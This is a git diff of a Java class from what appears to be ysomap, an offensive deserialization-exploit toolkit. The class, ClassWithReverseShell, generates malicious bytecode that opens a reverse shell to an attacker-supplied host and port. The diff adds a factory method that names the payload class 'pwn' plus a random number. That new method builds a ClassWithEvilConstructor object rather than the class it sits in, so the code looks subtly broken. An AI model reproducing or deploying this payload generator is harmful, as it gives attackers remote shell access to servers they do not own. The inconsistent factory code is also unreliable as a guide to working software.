@@ -1,8 +1,11 @@
 package ysomap.bullets.objects;
 
+import ysomap.bullets.AbstractBullet;
 import ysomap.bullets.Bullet;
 import ysomap.common.annotation.*;
 import ysomap.core.util.ClassFiles;
+
+import java.util.Random;
 
 /**
  * @author wh1t3P1g
@@ -13,7 +16,7 @@ import ysomap.core.util.ClassFiles;
 @Details("用于生成恶意字节码（可对外发起Socket连接，小型shell），配合SimpleHTTPServer使用")
 @Targets({Targets.CODE})
 @Dependencies({"*"})
-public class ClassWithReverseShell implements Bullet<byte[]> {
+public class ClassWithReverseShell extends AbstractBullet<byte[]> {
 
     @NotNull
     @Require(name = "classname", detail = "所需生成的类名")
@@ -35,5 +38,14 @@ public class ClassWithReverseShell implements Bullet<byte[]> {
     public byte[] getObject() throws Exception {
         String code = "host=\""+rhost+"\";\nport="+rport+";";
         return ClassFiles.makeClassWithReverseShell(classname, code);
+    }
+
+    public static Bullet newInstance(Object... args) throws Exception {
+        ClassWithEvilConstructor bullet = new ClassWithEvilConstructor();
+        bullet.set("type", "class");
+        bullet.set("rhost", args[0]);
+        bullet.set("rport", args[1]);
+        bullet.set("classname", "pwn"+new Random().nextLong());
+        return bullet;
     }
 }
